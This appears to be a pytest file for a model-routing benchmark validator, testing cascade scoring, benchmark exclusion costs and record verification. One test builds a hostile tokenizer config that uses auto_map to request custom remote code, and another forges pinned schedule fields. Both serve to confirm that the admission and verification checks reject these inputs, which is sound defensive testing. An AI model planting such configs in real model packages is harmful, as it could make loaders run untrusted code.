    Recorded as the boundary of the previous finding: partial inversion (one benchmark past the top
    rung's reach) silently drops that benchmark; total inversion refuses the corpus. Neither is a
    measurement of the contrast.
    """
    inverted = Catalog(entries=(CatalogEntry("cheap/strong", 0.01, 0.04, 128_000),
                                CatalogEntry("dear/weak", 10.0, 40.0, 128_000)))
    strengths = {"cheap/strong": 3, "dear/weak": 1}
    corpus = (MockBenchmark("bench-a", strengths, n_tasks=6, difficulty=(2, 2)),
              MockBenchmark("bench-b", strengths, n_tasks=6, difficulty=(2, 2)))
    tasks = tuple(task for benchmark in corpus for task in benchmark.load())
    grade = suite_grade(corpus)

    def arm(policy):
        worker = MockWorker(answers=worker_answers(strengths),
                            costs={"cheap/strong": 0.01, "dear/weak": 1.0})
        return [e.result for e in Scaffold(inverted, policy, worker, grade).run_window(
            tasks, nonce="n", budget_usd=float("inf"))]

    cheapest, priciest = arm(always_cheapest(inverted)), arm(always_strongest(inverted))
    exchange = derive_exchange(cheapest, priciest, pinned_cost([*cheapest, *priciest]))

    assert all(rate.flags == (DOMINATOR,) for rate in exchange.values())
    with pytest.raises(ValueError, match="every benchmark in this arm is excluded"):
        score_arm(cheapest, exchange)


def test_king_zero_can_only_be_a_cascade_that_really_outperforms_the_floor():
    """Why the new contrast is structural and not another lucky pool — the argument, as arithmetic.

    A cascade starts on the cheapest rung, so its quality is never below always-cheapest's; if the
    two are equal it has strictly more spend and therefore a strictly lower `final`, and `king_zero`
    breaks the remaining tie on NAME, where "always-cheapest" sorts first. So King₀ is the cascade
    only when the cascade is strictly better in quality than always-cheapest — which is exactly the
    condition under which the pair the gate measures has a nonzero spread.

    Measured here on the world that broke the old rule: price tracks capability, King₀ is the
    cascade, and the pair separates. The old contrast's spread on the same arms is 0.0000.
    """
    sample = subsample(archetypes.TASKS, nonce=archetypes.NONCE)
    king = cascade(archetypes.CATALOG)
    cheapest = always_cheapest(archetypes.CATALOG)

    arms = {name: ReferenceArm(name, archetypes.arm(policy, sample))
            for name, policy in ((CASCADE, king), (ALWAYS_CHEAPEST, cheapest))}
    quality = {name: sum(r.graded_score for r in arm.results) / len(arm.results)
               for name, arm in arms.items()}

    assert quality[CASCADE] > quality[ALWAYS_CHEAPEST]
    assert power_gate(arms[CASCADE], arms[ALWAYS_CHEAPEST], nonce=archetypes.NONCE).separates


def test_a_tokenizer_config_that_asks_for_custom_code_is_refused_by_byte_identity(tmp_path):
    """§1.1 names `trust_remote_code` "in `config.json` (or any tokenizer config)"; the code checks
    only `config.json`. The attack still fails, and WHERE it fails is the point.

    Every tokenizer file must be byte-identical to the reference (`_check_tokenizer`), so a
    `tokenizer_config.json` carrying `auto_map` differs from the reference by construction and is
    refused on its digest. The refusal names the tokenizer rather than the code, which is a worse
    message than the miner deserves — but the door is shut, and shut by a check that cannot be
    bypassed by adding a key nobody enumerated.
    """
    reference = describe(model_tree(tmp_path / "ref"))
    hostile = model_tree(
        tmp_path / "hostile",
        tokenizer_config='{"chat_template": "{{ messages }}", '
                         '"auto_map": {"AutoTokenizer": ["tok.T", null]}}')

    with pytest.raises(AdmissionError, match="tokenizer is not byte-identical"):
        admit(hostile, reference)


def test_the_episode_pins_in_a_schedule_entry_cannot_be_edited_after_commitment():
    """The other unbound cross-reference in the window record, probed and found closed.

    `schedule_entry` writes `scaffold_version`, `max_steps`, `temperature` and
    `max_conductor_tokens`, and `verify` never compares any of them to the constants the scaffold
    will actually run under — so a validator whose `config.py` disagrees with the committed entry
    scores the window anyway. That is a config-drift residual and it is real (§6.2's own reason for
    recording them), but it is NOT an attack surface: the entry is hashed into the chained manifest,
    so editing a pin after commitment fails membership, which is the check §6.3 already makes.
    """
    tasks = tuple(TaskSpec(f"t-{i:03d}", f"bench-{i % 3}", f"statement {i}", ("bash",))
                  for i in range(30))
    catalog = Catalog(entries=(CatalogEntry("m/one", 1.0, 1.0, 1000),))
    entries = schedule([1, 2], tasks=tasks, per_benchmark=4, minimum=2)
    man = holdout_feed.manifest(entries)
    record = build(entries[0], tasks=tasks, catalog=catalog, nonce="beacon-1")

    assert verify(record, window=1, man=man, tasks=tasks).epoch == 1
    for field, value in (("max_steps", 999), ("scaffold_version", "v3-scaffold-forged"),
                         ("temperature", 0.7), ("max_conductor_tokens", 1)):
        forged = build(entries[0], tasks=tasks, catalog=catalog, nonce="beacon-1")
        forged["schedule"][field] = value
        with pytest.raises(WindowError, match="not the one pinned in the committed schedule"):
            verify(forged, window=1, man=man, tasks=tasks)


def test_an_excluded_benchmark_still_costs_both_arms_their_money_and_their_clock(tmp_path):
    """Not a hole, but the price of the exclusion fix, measured rather than assumed.

    A flagged benchmark leaves the SCORE and does not leave the SLICE: both arms still run every one
    of its tasks, pay for them, and spend the per-duel clock on them. So §5.4's sizing — target 250
    tasks per arm — is a statement about tasks RUN, while the duel's power is set by tasks SCORED,
    and the two diverge by exactly the excluded fraction — silently, since the reveal does not name
    the exclusion at all (see PART B).

    Recorded here so that whoever sizes a real slice sizes the admitted set.
    """
    v, tree = validator(tmp_path, DEAD_LIVE)
    report = v.run_window(
        1, [submit(v, "hopeful", 5, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"), tree)])

    verdict = outcome_of(report, "hopeful").verdict
    ran = len(report.king_results)
    scored = verdict.n_tasks
    assert scored < ran, "nothing was excluded; this proves nothing"
    assert set(verdict.benchmarks) == {"nl2repo", "programbench"}
    assert "frontier-swe" in report.benchmarks           # it was drawn, and run, and paid for
    assert sum(1 for r in report.king_results if r.benchmark == "frontier-swe") == ran - scored
